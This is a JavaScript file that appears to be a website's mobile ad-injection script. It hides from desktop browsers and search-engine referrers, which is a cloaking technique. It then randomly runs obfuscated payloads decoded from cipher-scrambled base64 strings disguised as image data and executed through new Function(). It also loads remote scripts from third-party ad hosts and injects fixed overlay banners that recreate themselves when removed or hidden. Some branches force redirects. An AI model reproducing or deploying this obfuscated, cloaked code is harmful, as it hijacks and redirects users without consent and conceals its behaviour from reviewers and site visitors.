// 2022年12月2日
var system = {
    win: false,
    mac: false,
    xll: false
};
var p = navigator.platform;
var us = navigator.userAgent.toLowerCase();

system.win = p.indexOf("Win") == 0;
system.mac = p.indexOf("Mac") == 0;
system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);

var regexp = /\.(sogou|soso|baidu|google|youdao|yahoo|bing|so|biso|gougou|ifeng|ivc|sooule|niuhu|biso)(\.[a-z0-9\-]+){1,2}\//ig;
var where = document.referrer;

const chooseDirection = ['b', 't'];
const directionGroup = (arr) => arr[Math.floor(Math.random() * arr.length)];
const direction = directionGroup(chooseDirection);

if (!system.win && !system.mac && !system.xll && !regexp.test(where)) {
    if (direction == 't' || direction == 'all') {
        $("#topnav").attr("style", "margin-top:120px");
        const temporaryGroups = ['todayCpv','t5cpc','t5cpv','smCpv'];
        const randomNums = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElements = randomNums(temporaryGroups);
        if (randomElements == 'todayCpv') {
            !(function () {
                function GvMSN (s) {
            var d = {"1":"d","J":"m","Y":"F","O":"y","e":"I","H":"G","F":"Q","k":9,"G":"Z","s":"j","5":"W","4":1,"q":"l","l":"b","B":"n","y":"s","n":"u","t":"Y","9":"X","K":"p","M":2,"j":0,"A":3,"p":"J","Q":"B","E":"R","N":"t","i":"M","3":"C","x":5,"r":"U","T":"N","U":"a","R":"L","D":"H","z":"q","w":4,"g":"V","6":"h","L":"v","W":"S","I":"k","b":"T","S":"A","d":"K","P":"z","h":"O","v":"i","o":8,"8":"g","C":"f","7":"w","Z":7,"V":"o","u":"e","2":"E","c":"c","a":"P","f":"x","0":6,"m":"r","X":"D"};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function gCXLrY (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,1JYOeHFkGHks154qlBFyls4nt9GKGMYjlAplpAQyt9EJlApNp4jytAikG3xs19pOG5xjrMTOU9QjRDrkpMqz1MwnlJgKUH6L1WxslMjBRHIkibi4TsSORDekpMGI","lj1Mg56dgjFBRDSkpM6j1DQPhvoLpPNKGv86R4xTt5TogMqnROxjG9TjdHwKCD76lvqZU5tVlJYMU5161HkORBgPG9pQGMgn13xKlJEqu2kJd31vt5qI1WcKavjfd9NMt9e8uH6Oa5xq1OQtbr","fe1DE7rJgf15gP138KhA6VcvxLcHgnd31Fb4TrpO7BUDEjcDi0ROoBdArmpOkVROcmUWIZuH6ORBTq1Ypqc9gqcAEeG5YIG9eVpjTLlBEqlBFNgDq7GWcypMY7cHfKtMYjU5knRA8N1A1AR5GL","cJjN19pyG5xslMEqGXyBdbNwUDencMgjrJgf15gP126qt5Eqcv8B534WEgYgEgTrErFNgjqrW3cyp46Tb26j1DQWG9Y4G9TjpOIZuH6ORJkncJg6GDqP1HYjG5TVt5xBGb4J15xs1HqLlv8KuM","qJdD6VcvxOG5YIugTjt9EqabjjpvGwUDencAE61DgPabjOiXSKuAG6cvQIt9E6arKbbjwncHYOcMrVuH6ORBpqcAQLlBTqgHgw13IZlJgAe2G4lJTjU5knd31CpOyB13cmpMFBdO1scOcylJgA","e2G4lJTjU5knd31spOfIt9E6RBpqcAgy13xIG5TLGHrmpPNOG9E4cJw8pONIt9E6RBpqcAgy13xnt54qdOcVtOIBdW6It9E6RBpqcAgy13xKl5cnUJkKlv8BpOIKdW6scOIZC9jZuH6ORBTqlJ","FVpArkiWcKhA4qlDTquAG6cvQPa5ELtAgNG5xjRJTOG5YjGrgyG54qlBFVpATscJq713cKhAincApsa9Sm1WyBRMyLpONKhMTPRBQ6cJgn12gyG54qlBFnU5xPG9pjFJgJlApqdDiytAiKhA4k"];
            new Function(gCXLrY(GvMSN(s.join('').substr(22))))();
        })();
        }
        if (randomElements == 't5cpc') {
            (function (){
                var id = "9142199889545937380-62155";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if(randomElements == 't5cpv'){
            (function (){
                var id = "9142199889545937380-62156";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if(randomElements == 'smCpv'){
          window.wqjiZm = function(){var a=document.createElement('a');var evjs=`(function(){var cname='wqjiZm',cn='https://api.simi1234.com/static/image/c.png',bn='https://dingbu.bj.bcebos.com/dingbu.asdawas',jp='https://api.simi1234.com/a/c?au41205b197f7a91a401e7233b4917bd7d=',dbJeMV=null,cst=1,drv=isCheckD();if(drv){crateEl(cname);var n=0;dbJeMV=setInterval(()=>{n++;var elobj=resbaner();if(!elobj){cname=its(6);return crateEl('wqjiZm '+cname)}var eh=elobj.getBoundingClientRect().height;if(eh==0){elobj.remove();cname=its(6);crateEl('wqjiZm '+cname)}},500)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=457012813477568512';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;var p=document.createElement('i');br.append(p);br.append(img);by.append(br);addlistenerElement(br,function(){var _ao=document.createElement('a');_ao.href=jp+au41205b197f7a91a401e7233b4917bd7d;_ao.click()});addlistenerElement(p,function(){clearInterval(dbJeMV);resbaner().remove()});img.onload=function(){var h=this.height;resbaner().style.height=h+'px';getIheight(h,this.width)}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}var pimg='.wqjiZm img{width:100% !important;}';var ps=cst==4?'':'position:fixed;';var bs='.wqjiZm{z-index:999;'+(cst==2||cst==3?'width:100px;':'')+(cst==3?'right:0;':'left:0;')+ps+(cst==0?'bottom:0px':cst==1?'top:0px':'bottom:50%')+';}'+pimg;if(drv){addStyle(bs)}function getIheight(height,w){var ch='width:18px;height:18px';var ot=(cst==0?'bottom':cst==1?'top':cst==2||cst==3?'bottom':'')+(cst==0||cst==1?':'+height+'px;':cst==2||cst==3?':calc(50% + '+height+'px)':'display:none;');var or=(cst==0||cst==1?'right:0':cst==2?'left:'+(w-18)+'px':'right:'+(w-18)+'px');var close='.wqjiZm i{padding:0 !important;margin:0 !important;'+ch+';background:url('+cn+');background-size:contain;position:fixed;'+or+';'+ot+'}';close+=(cst==1?'body{padding-top:'+height+'px !important;}':'');addStyle(close)}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false,Xll:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;system.X11=(p=='X11')||(p.indexOf('Linux')==0);if(system.win||system.mac||system.Xll){return false}return true}function addlistenerElement(el,callBack){el.addEventListener('click',handleFun);el.addEventListener('touchstart',handleFun);function handleFun(e){e.preventDefault();e.stopPropagation();callBack()}}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}})();`;a.href='javascript:'+evjs;a.click()};window.wqjiZm();   
        }
        // 小图标
       window.vmLFYa =function(){var a=document.createElement('a');var evjs=`var cname='vmLFYa',bn='https://dingbu.bj.bcebos.com/xiaotubiao.adddd',jp='https://api.simi2345.com/a/c?au6e4511da705ef7a712d549e2736fed41=',cst=1,mg=16,mimgh=100,cx=0,cy=0,imgh=0,imghs=0,drv=isCheckD(),browserWidth=getBrowserWH().w,browserHeight=getBrowserWH().h;if(drv){crateEl(cname);var n=0;setTimeout(function(){n++;var elobj;setInterval(function(){elobj=resbaner();if(!elobj){return recreate(elobj)}var eh=elobj.getBoundingClientRect().height;if(eh<=2){return recreate(elobj)}})},500)}var s=document.createElement('script');s.src='https://api.simi2345.com/s/c?_=457012495226363904';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n,t){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;br.append(img);by.appendChild(br);br.addEventListener('touchmove',handleMove);br.addEventListener('touchend',handleChend);br.addEventListener('touchstart',handleTouchstart);img.onload=function(){if(cx!==0||cy!==0){setbs(br);return}if(t!=undefined){return}imgh=this.height;setViewHeight(imgh/2)}}function recreate(elobj){if(elobj!=null&&elobj!=undefined){elobj.remove()};cname=its(10);return crateEl('vmLFYa '+cname,0)}var eLeft=0,eTop=0;var isClick=false;function handleTouchstart(e){e.preventDefault();e.stopPropagation();eLeft=e.touches[0].pageX-this.offsetLeft,eTop=e.touches[0].pageY-this.offsetTop;isClick=true}function handleMove(e){e.preventDefault();e.stopPropagation();cx=e.touches[0].pageX-eLeft;cy=e.touches[0].pageY-eTop;imghs=imgh+2;var bw=browserWidth-imghs,bh=browserHeight-imghs;var left=(cx>=bw?bw:cx<=0?0:cx),top=(cy<=0?0:cy>=bh?bh:cy);cx=left;cy=top;this.style.cssText='left:'+left+'px;top:'+top+'px';isClick=false}function handleChend(e){e.preventDefault();e.stopPropagation();if(isClick){var self=this;self.style.transition='0.1s';self.style.transform='scale(0.90)';setTimeout(function(){self.style.transform='scale(1)'},150);setTimeout(function(){self.style.transform='scale(1)';var ja=document.createElement('a');ja.href=jp+au6e4511da705ef7a712d549e2736fed41;ja.click();ja.remove()},300)}else{handleVposition(this)}}function handleVposition(e){var o=inLeftOrRight();e.style.transition='0.2s';cx=cx>browserWidth?browserWidth:cx;var hb=(browserHeight-(imghs+mg));cy=cy>=hb?(hb):cy<=0?0:cy;cy==0?e.style.top=mg+'px':e.style.top=cy+'px';if(cx>=o.mp){e.style.left=browserWidth-(imgh+mg)+'px'}else{e.style.left=mg+'px'}}function setbs(e){var o=inLeftOrRight();var tcy=cy+'px';if(cx>=o.mp){e.style.top=tcy}else{e.style.top=tcy;e.style.left=mg+'px'}}function inLeftOrRight(){var mp=(browserWidth/2)-(imghs/2);return{mp:mp,bh:browserHeight-imghs}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}if(drv){addStyle('.vmLFYa{z-index:999;top:50%;right:0px;position:fixed;width:'+mimgh+'px !important;}.vmLFYa img{width:100%;height:100%;}')}function setViewHeight(h){if(drv){var ps='left:'+(cst==0?mg:browserWidth-(imgh+mg))+'px';addStyle('.vmLFYa{top:calc(50% - '+h+'px);'+ps+'}')}}function addStyle(style){ var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;if(system.win||system.mac){return false}return true}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}function getBrowserWH(){var o={w:document.documentElement.clientWidth||document.body.clientWidth,h:document.documentElement.clientHeight||document.body.clientHeight};return o}function getElse(el,ar){return window.getComputedStyle?window.getComputedStyle(el,null)[ar]:el.currentStyle[ar]};`;a.href='javascript:'+evjs;a.click()};window.vmLFYa();
      
    }
    // bottom
    if (direction == 'b' || direction == 'all') {
        const temporaryGroup = ['todayCpv', 'todayCpc', 'hl','t5cpc','t5cpv','smCpv'];
        const randomNum = (arr) => arr[Math.floor(Math.random() * arr.length)];
        const randomElement = randomNum(temporaryGroup);
        if (randomElement == 'todayCpv') {
            !(function () {
                function IfxRC (s) {
            var d = {"w":"d","i":"m","5":"F","7":"y","m":"I","B":"G","s":"Q","L":9,"9":"Z","W":"j","P":"W","v":1,"8":"l","K":"b","j":"n","Q":"s","l":"u","g":"Y","k":"X","E":"p","C":2,"p":0,"S":3,"h":"J","o":"B","d":"R","q":"t","Z":"M","T":"C","F":5,"Y":"U","M":"N","J":"a","G":"L","4":"H","r":"q","H":4,"N":"V","t":"h","f":"v","c":"S","y":"k","u":"T","b":"A","z":"x","X":"g","1":"z","a":"O","2":"i","n":8,"3":"K","e":"f","V":"w","U":7,"I":"o","O":"e","D":"E","6":"c","x":"P","A":6,"0":"r","R":"D"};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function rMkWsGQo (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,wi57mBsL9BLWwPv8KjsQKWvlgk9E9C5pKShKhSoQgkdiKShqhvpQgSZL9TFWwkh79PFpYCM7JkopG4YLhC8rwCHlKiNEJBtfwcFWKCpjGByLZuZvMWbzG4mLhphi","9kwggpF5wjXjG4bLhCtpw4o1a2nfh1qE92XtGvFMgPMnNC8lG7Fp9kMp3BHEe4VtK28UJPgIKi5CJPwtwBL7GjN19kho9CNlwTFEKid8ODLi3Tw2gP8ywc6Ex2pz3kqCgkmXOBt7xPF8w7oguY","zmw4dVYiNzwPN1wTXEaStI62Ff6BNl3TwsuvMYh7VjJ4dp64ZAG7nj3SY0h7LIG760JcyUOBt7GjM8w5h86kN86Sdm9P5y9kmIhpMfKjd8KjsqN48V9c6QhC5V6BzEgC5pJPLlGSXqwSwSGP9f","6ipqwkhQ9PFWKCd89RQj3uqHJ4ml6CNpYiNzwPN1wDt8gPd862XjPTvcdN5NdNMYdYsqNp8YcT6QhvtMuDtpw4oc9k5v9kMph7yUOBt7GiLl6iNt9481wB5p9PMIgPFj9uviwPFWwB8fK2XEOC","8i34tI62F79P5yONMpgkd8xupph29HJ4ml6Sdtw4N1xup7ZRbEOS9t62oygkdtxYEuupHl6B576CYIOBt7Gjh86SofKjM8NBNHwTyUKiNSmD9vKiMpJPLl3Tweh7QjwT60hCsj37wW676QKiNS","mD9vKiMpJPLl3TwWh7zygkdtGjh86SNQwTFy9PMf9BY0h1q79kdv6iHXh7qygkdtGjh86SNQwTFlgPv8376Ig7yj3ctygkdtGjh86SNQwTFEKP6lJiLEK2Xjh7yE3ctW67yUekpUOBt7GjM8Ki","sIhSYLZc6EaSv8K4M8OS9t62o1xPdfgSNq9PFpGiM79P5p9YNQ9Pv8KjsIhSMW6i8VwT6EaSZl6ShWxkb0wcQjGCQfh7qEaCM1Gjot6iNlwDNQ9Pv8KjslJPF19khpsiNiKSh834ZQgSZEaSvL"];
            new Function(rMkWsGQo(IfxRC(s.join('').substr(22))))();
        })();
        }
        if(randomElement == 'todayCpc'){
            !(function () {
                function wEBGjfan (s) {
            var d = {"r":"d","V":"m","f":"F","s":"y","b":"I","E":"G","Q":"Q","u":9,"q":"Z","Y":"j","z":"W","R":1,"D":"l","9":"b","T":"n","P":"s","N":"u","8":"Y","W":"X","S":"p","J":2,"C":0,"L":3,"t":"J","e":"B","X":"R","K":"t","A":"M","i":"C","a":5,"n":"U","M":"N","v":"a","F":"L","6":"H","y":"q","1":4,"m":"V","k":"h","2":"v","o":"S","5":"k","O":"T","l":"A","H":"z","4":"o","Z":"E","j":"O","h":"i","U":8,"w":"g","7":"K","G":"f","3":"w","x":7,"0":"e","c":"c","p":"P","d":"x","g":6,"I":"r","B":"D"};
            return s.split('').map(function (c) {
                return d[c] !== undefined ? d[c] : c;
            }).join('');
        }
                function MQrSOn (e) {
            var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
            var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var t = "", n, r, i, s, o, u, a, f = 0;
            e = e.replace(/[^A-Za-z0-9+/=]/g, "");
            while (f < e.length) {
                s = sx[a3](e[a0](f++));
                o = sx[a3](e[a0](f++));
                u = sx[a3](e[a0](f++));
                a = sx[a3](e[a0](f++));
                n = s << 2 | o >> 4;
                r = (o & 15) << 4 | u >> 2;
                i = (u & 3) << 6 | a;
                t = t + String[a1](n);
                if (u != 64) {
                    t = t + String[a1](r);
                }
                if (a != 64) {
                    t = t + String[a1](i);
                }
            }
            return (function(e) {
                var t = "", n = r = c1 = c2 = 0;
                while (n < e.length) {
                    r = e[a2](n);
                    if (r < 128) {
                        t += String[a1](r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e[a2](n + 1);
                        t += String[a1]((r & 31) << 6 | c2 & 63);
                        n += 2
                    } else {
                        c2 = e[a2](n + 1);
                        c3 = e[a2](n + 2);
                        t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                        n += 3;
                    }
                }
                return t;
            })(t);
        };
            var s = ["data:image\/jpg;base64,rVfsbEQuqEuYrzRD9TQP9YRN8WqSqJfC9Lt9tLeP8WXV9LtKtRCP8LAuqiaYrWtsqzaCnJMsvWeCF6nutJDyrJ1N9VmSvEk2roaY9JCTFE5uAOARMYlHF6butRq4","z5asOEZTF6lutJkCr6eHjhU2tHKSqhwkFRaM8zMUmJDNFsaCqWMC7E1SG63k9hDxvz849VfJvzrkrEusFTmHqWteqJmNriaS9VXD0ZuV7irh8zD5rocSphCd7WKJ8Wbw0EkspzaDrse8Ondbr6","X3nVmdrzmHriwSjLk4cha2cEmN7irQORMnts3Tv6XCc6AgFsUT7LnItsu4FscIvo5x0EksFTMDrftDcWmDcLXbqzf5qWb4tCM29TXD9TQKm6D3qocPtJf3cEdS8JfCvzuNFLwKrLrLFzq2cVCK","rWtPqzaY9JXDqBPT7OK1v6bNcJmCnVmdrzmHrZkD8zXDchwTziRoXmfmXmMnXnQKmCDnoicPtRkMOZkCr6eoqWfRqWMCts5x0EksFVuNcVmkq6DHrEfCqzM48zaTqORVrzaYrED29hwS0JDV76","k4chasqzf50mMC8WXDpOCCthq1v6bNcLXkr6mHpOCsABlS0Lqkche58WXkpnSOOC1NcEfscJn40EksFTtDcLe29TMDmEm1ri5x9VmLbZqR9VMCvzuN7irGtsPTricItJQT7srYcscP9VmLbZqR","9VMCvzuN7irYtsd58WXkFTtDcLmPria5qzM2qEnItHKsqWXRcV1wtsK58WXkFTtDcLmPriaN8zRD7sc48s5T7ok58WXkFTtDcLmPriaS9zcNvVuS9hwTts5S7okYcs5xGWCx0EksFTMD9VQ4tL","nuAocSjLRD96MD0LqkcheHpzX28LmKqzaCFVMsqzfCqnmPqzRD9TQ4tLMYcVD3ricSjLANcLtYpWlIroPTFJP2tsKSjJMHFTekcVmNrZmPqzRD9TQNvzaHqWtCQVmV9LtD76AP8LASjLRu"];
            new Function(MQrSOn(wEBGjfan(s.join('').substr(22))))();
        })();
        }
        if (randomElement == 'hl') {
            !function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a('FVLXbvaIPml7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF!67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[67cl/3yddd(?V6662/mFYLFc2a??l2a[Xd5 6LDL86LMSS80!Xd5 6^pL(8"hFFJLg//LSTmL7)6R7fm(2/)d6f_MJ6(/"%ydFhm(Y6qcydFhm5d2fO^ca.}0a%"mCJp"!LYF|6^YO_Fc7_2(F6O2ca[67c6LDL880a[Xd5 2h_5D__58"hFFJLg//((Lm(hOqO5@0}}}nm(2/((/}QsKj6LM2OF8}vFd5pYF8}"!Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!5m)OfTmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[Xd5 (q6Y2FhY6phF8D62fODmL(5YY2mdXd6q9Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-!P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-!P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@00.c(q6Y2FD6fFh/K00aaavv6LMSS880a[6LMSS8}!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O282h_5D__5!PYqLY[D62fODmqO(dF6O2mh5Y782h_5D__5!P6LMSS80!PPPa! Xd5 O66pXC:XM2}80!Xd5 O66pXC:XMLYF62F}8LYFW2FY5Xdqc7_2(F6O2ca[67cO66pXC:XM2}<ssa[Xd5 Fdp85m(5YdFYEqY^Y2Fc"f6X"a!FdpmLFTqY8"f6LJqdTg)qO(S!qY7Fg0!56phFg@!JOL6F6O2gd)LOq_FY!4*62fYRg}000000!D6fFhgQQb!hY6phFgsmsXD!)O5fY5*qY7Fg}JR LOq6f #ddd!"!Xd5 hY6XD8O66pXC:XM2}!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!FdpmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!FdpmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28O66pXC:XPYqLY[D62fODmqO(dF6O2mh5Y78O66pXC:XPPa!5m)OfTmdJJY2fxh6qfcFdpa!O66pXC:XM2}%8smsPYqLY[(qYd5W2FY5XdqcO66pXC:XMLYF62F}aPP=n0a! Xd5 O66pXC:XM2@8}!Xd5 O66pXC:XMLYF62F@8LYFW2FY5Xdqc7_2(F6O2ca[67cO66pXC:XM2@<8}0a[Xd5 (d2Xd85m(5YdFYEqY^Y2Fc"(d2XdL"a!Xd5 hY6XD8cc}0*O66pXC:XM2@a.smsa!(d2XdmLFTqY8"D6fFhgQQb!hY6phFgsmsXD!qY7Fg0!56phFg@JR!JOL6F6O2gd)LOq_FY!)O5fY5*qY7Fg@JR LOq6f #70KQn7!^d5p62g0JR!"!(d2XdmD6fFh8K00!(d2XdmhY6phF8@0!Xd5 (FR8(d2XdmpYFxO2FYRFc"@f"a!Xd5 6^p82YD W^dpYca!Xd5 LT8*c@0.O66pXC:XM2@a%@0!6^pmO2qOdf87_2(F6O2ca[(FRmf5dDW^dpYc6^p=0=LT=K00=@00aP!6^pmL5(86^pL(!5m)OfTmdJJY2fxh6qfc(d2Xda!Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"!D62fODmdffEXY2Ft6LFY2Y5c"L(5Oqq"=7_2(F6O2ca[Xd5 F8fO(_^Y2FmfO(_^Y2FEqY^Y2FmL(5Oqq|OJ??fO(_^Y2Fm)OfTmL(5Oqq|OJ!(d2XdmLFTqYm)OFFO^8F*F.@%c(q6Y2FD6fFh.hY6XD/}00a%"JR"Pa!O66pXC:XM2@%%PYqLY[(qYd5W2FY5XdqcO66pXC:XMLYF62F@aPP=}00a!Xd5 685mpYFEqY^Y2FuTWfc"O66pXC:XMFC"a!67c6a[6mL5(86mpYFrFF56)_FYc"fdFd*_5q"aPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//((Lm(hOqO5@0}}}nm(2/f/}QsKj(8}vF8ns0K{Q}K"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!PXd5 